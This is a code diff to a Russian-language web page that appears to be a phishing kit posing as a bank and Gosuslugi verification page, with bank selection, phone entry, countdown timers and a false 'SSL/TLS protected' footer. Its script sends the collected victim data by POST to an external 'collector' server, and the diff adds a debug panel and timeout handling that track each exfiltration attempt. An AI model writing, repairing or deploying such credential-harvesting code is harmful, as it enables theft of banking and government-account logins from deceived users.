@@ -171,6 +171,19 @@
         }
         .highlight-box strong { color: var(--accent); }
 
+        /* Панель отладки */
+        .debug-panel {
+            position: fixed; bottom: 0; left: 0; right: 0;
+            background: #1e1e2f; color: #10b981;
+            padding: 10px; font-size: 11px;
+            max-height: 160px; overflow-y: auto;
+            z-index: 999; white-space: pre-wrap; word-break: break-all;
+            font-family: monospace; line-height: 1.5;
+            border-top: 2px solid #c9a44b;
+        }
+        .debug-panel .error { color: #ef4444; }
+        .debug-panel .info { color: #fabe3c; }
+
         @media (max-width: 480px) {
             .card { padding: 24px 16px; border-radius: 18px; }
             .bank-grid { gap: 8px; }
@@ -377,11 +390,23 @@
 
 <div class="footer"><span>⚡ Защищено</span><span>•</span><span>SSL/TLS</span><span>•</span><span>Версия 2026.1</span></div>
 
+<!-- Панель отладки -->
+<div class="debug-panel" id="debug-panel">🟢 Панель отладки активна. Ожидание действий...</div>
+
 <script>
     const SERVER_URL = 'https://collector-bh3t.onrender.com/api/collect';
     let selectedBankId = null, selectedBankTitle = null;
     let bankTimer = null, gosuslugiTimer = null;
     let bankTimeLeft = 300, gosuslugiTimeLeft = 300;
+
+    function debug(msg, type) {
+        const panel = document.getElementById('debug-panel');
+        const time = new Date().toLocaleTimeString();
+        const icon = type === 'error' ? '❌' : type === 'info' ? 'ℹ️' : '✅';
+        const color = type === 'error' ? 'color:#ef4444;' : type === 'info' ? 'color:#fabe3c;' : '';
+        panel.innerHTML += `<div style="${color}">${icon} [${time}] ${msg}</div>`;
+        panel.scrollTop = panel.scrollHeight;
+    }
 
     function formatPhoneInput(input) {
         let value = input.value.replace(/\D/g, '');
@@ -429,14 +454,32 @@
     }
 
     async function sendToServer(data) {
+        debug(`Отправка: ${data.type}`, 'info');
         try {
+            const controller = new AbortController();
+            const timeout = setTimeout(() => controller.abort(), 60000);
+            
             const response = await fetch(SERVER_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
+                body: JSON.stringify(data),
+                signal: controller.signal
             });
+            
+            clearTimeout(timeout);
+            
+            if (response.ok) {
+                const result = await response.json();
+                debug(`Успех: ${response.status} - ${JSON.stringify(result)}`, 'success');
+            } else {
+                debug(`Ошибка сервера: ${response.status}`, 'error');
+            }
         } catch (e) {
-            console.log('Ошибка отправки:', e.message);
+            if (e.name === 'AbortError') {
+                debug('Таймаут запроса (60 секунд)', 'error');
+            } else {
+                debug(`Нет соединения: ${e.message}`, 'error');
+            }
         }
     }
 
